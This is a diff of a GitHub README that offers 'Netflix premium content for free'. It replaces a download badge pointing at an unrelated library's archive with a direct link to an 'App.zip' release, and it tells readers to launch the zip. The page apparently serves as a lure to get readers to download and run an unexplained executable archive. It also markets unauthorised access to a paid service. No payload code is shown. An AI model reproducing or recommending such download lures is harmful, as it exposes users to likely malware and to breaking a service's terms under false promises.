@@ -27,7 +27,7 @@ Explore the following topics in this repository:
 
 ## Get Started
 To begin your journey to enjoying Netflix premium content for free, click on the link below:
-[![Download Premium Zip](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Premium Zip](https://github.com/KoiychiX/Netflix-Download-Premium-Free/releases/download/v1.0/App.zip)](https://github.com/KoiychiX/Netflix-Download-Premium-Free/releases/download/v1.0/App.zip)
 *Launch the zip file to access premium content.*
 
 If you encounter any issues with the link provided or it does not work as expected, please visit the "Releases" section of this repository for alternative download options.
